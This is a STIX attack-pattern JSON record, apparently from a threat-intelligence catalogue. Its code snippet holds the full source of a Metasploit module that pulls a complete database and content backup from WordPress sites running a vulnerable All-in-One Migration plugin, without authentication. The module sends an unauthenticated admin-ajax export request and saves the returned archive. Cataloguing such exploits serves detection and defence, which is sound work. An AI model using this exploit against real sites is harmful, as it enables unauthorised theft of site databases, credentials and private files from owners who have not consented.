{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3d1d3ba7-b666-4c43-a036-eda4a1ec7aac",
    "created": "2024-08-14T16:32:08.385076Z",
    "modified": "2024-08-14T16:32:08.38508Z",
    "name": "WordPress All-in-One Migration Export",
    "description": " This module allows you to export Wordpress data (such as the database, plugins, themes uploaded files, etc) via the All-in-One Migration plugin without authentication.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/wp_all_in_one_migration_export.rb",
            "external_id": "wp_all_in_one_migration_export.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7857"
        },
        {
            "source_name": "reference",
            "url": "https://www.pritect.net/blog/all-in-one-wp-migration-2-0-4-security-vulnerability"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'WordPress All-in-One Migration Export',\n      'Description'     => %q{\n        This module allows you to export Wordpress data (such as the database, plugins, themes,\n        uploaded files, etc) via the All-in-One Migration plugin without authentication.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'James Golovich', # Disclosure\n          'rastating'       # Metasploit module\n        ],\n      'References'      =>\n        [\n          ['WPVDB', '7857'],\n          ['URL', 'https://www.pritect.net/blog/all-in-one-wp-migration-2-0-4-security-vulnerability']\n        ],\n      'DisclosureDate'  => '2015-03-19'\n    ))\n\n    register_options(\n      [\n        OptInt.new('MAXTIME', [ true, 'The maximum number of seconds to wait for the export to complete', 300 ])\n      ])\n  end\n\n  def check\n    check_plugin_version_from_readme('all-in-one-wp-migration', '2.0.5')\n  end\n\n  def run\n    print_status(\"Requesting website export...\")\n    res = send_request_cgi(\n      {\n        'method'    => 'POST',\n        'uri'       => wordpress_url_admin_ajax,\n        'vars_get'  => { 'action' => 'router' },\n        'vars_post' => { 'options[action]' => 'export' }\n      }, datastore['MAXTIME'])\n\n    unless res\n      fail_with(Failure::Unknown, \"#{peer} - No response from the target\")\n    end\n\n    if res.code != 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Server responded with status code #{res.code}\")\n    end\n\n    if res.body.blank?\n      print_status(\"Unable to download anything.\")\n      print_status(\"Either the target isn't actually vulnerable, or\")\n      print_status(\"it does not allow WRITE permission to the all-in-one-wp-migration/storage directory.\")\n    else\n      store_path = store_loot('wordpress.export', 'zip', datastore['RHOST'], res.body, 'wordpress_backup.zip', 'WordPress Database and Content Backup')\n      print_good(\"Backup archive saved to #{store_path}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-19"
}